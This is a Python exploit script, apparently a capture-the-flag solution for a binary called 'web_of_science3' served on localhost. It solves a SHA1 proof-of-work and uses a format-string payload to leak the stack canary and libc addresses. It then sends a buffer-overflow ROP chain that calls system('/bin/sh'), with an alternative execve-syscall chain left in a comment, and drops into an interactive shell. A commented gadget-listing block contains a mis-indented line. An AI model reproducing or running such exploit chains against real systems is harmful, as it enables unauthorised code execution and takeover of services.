from pxwn import *
import hashlib
import angr
import string
import itertools

"""
#================================================
exp = Exploit("segsh",64)
gadget1 = exp.rop("prdi")
gadget2 = exp.rop("prsi")
gadget3 = exp.rop("ppr")
gadget4 = exp.rop("pppr")
gadget5 = exp.rop("ppppr")
gadget6 = exp.rop("/bin/sh")
gadget7 = exp.rop("leave")
#================================================
print "=" * 30
if gadget1 != "Gadgets Not Found!":
    print "pop rdi:" + hex(gadget1)
else:
    print gadget1

print "=" * 30


print "=" * 30

if gadget2 != "Gadgets Not Found!":
    for i in gadget2:
        print "pop rsi: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget2

print "=" * 30

if gadget3 != "Gadgets Not Found!":
    for i in gadget3:
        print "pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget3

print "=" * 30

print "=" * 30
if gadget4 != "Gadgets Not Found!":
    for i in gadget4:
            print "pop pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget4

print "=" * 30

print "=" * 30
if gadget5 != "Gadgets Not Found!":
    for i in gadget5:
        print "pop pop pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget5

print "=" * 30
"""
def leakfivebytes(leak):
    for i in itertools.permutations(range(0, 256), 5):
        obj  = leak + ''.join(chr(c) for c in i)
        answer = hashlib.sha1(obj)
        if answer.digest()[-3:] == '\xff\xff\xff':
            return obj


""
#=========================================================
local=False

if local:
    p = process("./web_of_science3")
    pause()
    p.debug()
else:
    HOST = "localhost"
    PORT = 45678
    p = connect(HOST,PORT)
    pause()
    p.debug()
#=========================================================

answer = p.recvl()
answer = answer.split("==")
answer = answer[3].strip("\n")
print "Answer: ",answer

found = leakfivebytes(answer)
p.sendl(found)
p.recvul(">")
p.sendl("1")
p.recvul(">")
p.sendl("3")
p.recvul(":")
p.sendl("%p."*70)
p.recvul(">")
p.sendl("9")
p.recvul(">")
p.sendl("4")
p.recvul(":")
p.sendl("0")
p.recvul("Abstract:")
p.recvl()
leak = p.recvl()
leak = leak.split(".")
canary = pk64(int(leak[18].strip("\n"),16))
libc = int(leak[1],16)-0x3c09e0
system = int(leak[2],16)-0xa5230
binsh = int(leak[2],16)+0x9146b
syscall = pk64(libc+0x000c1e55)

rax = pk64(libc+0x00048858) # pop rax ; 
rdi = pk64(0x004019f3) #  pop rdi ; ret  ;  
rsi = pk64(libc+0x00024805) #  pop rsi ; ret ; 
rdx = pk64(libc+0x000bcee0) #pop rdx; ret;

print green("System: "),hex(system)
print green("Binsh: "),hex(binsh)
print green("libc: "),hex(libc)

p.recvul(">")
p.sendl(p.payload(40)+canary+"B"*8+pk64(0x00000000004019f3)+pk64(binsh)+pk64(system))

"""
p.sendl(p.payload(40)+canary+"B"*8+rax+pk64(59)+rdi+pk64(binsh)+rsi+pk64(0)+rdx+pk64(0)+syscall)

"""
p.sendl("5")
p.interactive()

